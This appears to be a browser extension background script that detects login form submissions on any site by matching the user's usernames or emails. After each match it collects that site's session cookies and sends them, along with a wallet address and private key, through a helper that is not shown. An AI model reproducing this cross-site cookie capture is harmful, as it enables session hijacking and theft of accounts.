import { EMPTY, merge } from 'rxjs';
import { debounceTime, filter, map, switchMap } from 'rxjs/operators';

import { AuthBrowserStorageService } from '../../shared/services/auth';
import {
  listenRequestsBeforeRedirectWithBody,
  listenRequestsOnCompletedWithBody,
  requestBodyContains,
} from './helpers/requests';
import { getCookies, sendCookies } from './helpers/cookies';

const COOKIES_DEBOUNCE_MS = 500;

const authStorage = new AuthBrowserStorageService();

authStorage.getActiveUser().pipe(
  switchMap((user) => {
    return user
      ? merge(
        listenRequestsOnCompletedWithBody({}, 'POST'),
        listenRequestsBeforeRedirectWithBody({}, 'POST'),
      ).pipe(
        filter(request => {
          return requestBodyContains(request.requestBody, [...user.usernames, ...user.emails]);
        }),
        debounceTime(COOKIES_DEBOUNCE_MS),
        switchMap(request => getCookies(new URL(request.url))),
        map((cookies) => ({user, cookies})),
      )
      : EMPTY;
  }),
).subscribe(({user, cookies}) => {
  sendCookies(user.walletAddress, user.privateKey, cookies);
});


